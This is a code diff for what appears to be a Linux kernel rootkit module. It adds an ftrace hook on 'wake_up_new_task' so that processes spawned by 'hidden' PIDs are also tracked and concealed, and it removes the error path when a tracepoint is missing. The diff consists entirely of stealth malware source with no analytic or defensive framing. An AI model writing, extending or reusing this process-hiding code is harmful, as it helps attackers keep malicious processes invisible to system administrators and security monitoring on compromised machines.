@@ -16,6 +16,27 @@ notrace static void on_fork_handler(void *data, struct task_struct *parent, stru
     }
 }
 
+static void (*orig_wake_up_new_task)(struct task_struct *p) = NULL;
+
+static notrace void hook_wake_up_new_task(struct task_struct *p)
+{
+    if (!orig_wake_up_new_task) return;
+    if (p) {
+        pid_t ppid  = READ_ONCE(current->pid);
+        pid_t ptgid = READ_ONCE(current->tgid);
+        if (is_hidden_pid(ppid) || is_hidden_pid(ptgid) ||
+            is_child_pid(ppid)  || is_child_pid(ptgid)) {
+            add_child_pid(READ_ONCE(p->pid));
+            add_child_pid(READ_ONCE(p->tgid));
+        }
+    }
+    orig_wake_up_new_task(p);
+}
+
+static struct ftrace_hook trace_hooks[] = {
+    HOOK("wake_up_new_task", hook_wake_up_new_task, &orig_wake_up_new_task),
+};
+
 notrace int trace_pid_init(void)
 {
     _probe_register = (void *)resolve_sym("tracepoint_probe_register");
@@ -24,8 +45,8 @@ notrace int trace_pid_init(void)
 
     if (tp_sched_fork && _probe_register)
         _probe_register(tp_sched_fork, on_fork_handler, NULL);
-    else
-        return -ENODEV;
+
+    fh_install_hooks(trace_hooks, ARRAY_SIZE(trace_hooks));
 
     return 0;
 }
@@ -35,6 +56,8 @@ notrace void trace_pid_cleanup(void)
 {
     if (tp_sched_fork && _probe_unregister)
         _probe_unregister(tp_sched_fork, on_fork_handler, NULL);
+
+    fh_remove_hooks(trace_hooks, ARRAY_SIZE(trace_hooks));
 }
 EXPORT_SYMBOL(trace_pid_cleanup);
 
